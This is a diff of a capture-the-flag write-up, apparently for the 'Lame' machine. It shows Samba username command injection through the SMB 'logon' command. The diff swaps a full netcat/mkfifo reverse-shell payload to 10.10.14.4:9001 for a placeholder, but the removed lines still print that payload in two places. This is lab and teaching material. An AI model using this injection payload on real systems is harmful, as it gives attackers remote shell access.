@@ -337,7 +337,7 @@ Therefore, after logging in to the SMB server, the command we should enter to
 exploit this CVE is:
 
 ```sh
-logon "/`nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.4 9001 >/tmp/f`"
+logon "/`nohup <REVSHELL_PAYLOAD>`"
 ```
 
 ### Exploitation
@@ -352,7 +352,7 @@ Let's connect to the SMB server and access the only share we have access to,
 Then, we can enter our payload followed by a random password:
 
 ```sh
-smb: \> logon "/`nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.4 9001 >/tmp/f`"
+smb: \> logon "/`nohup <REVSHELL_PAYLOAD>`"
 ```
 
 If we check our listener:
@@ -578,6 +578,8 @@ lame
 ```
 
 Yeah I know, very surprising.
+
+## System enumeration
 
 ### Flags
 
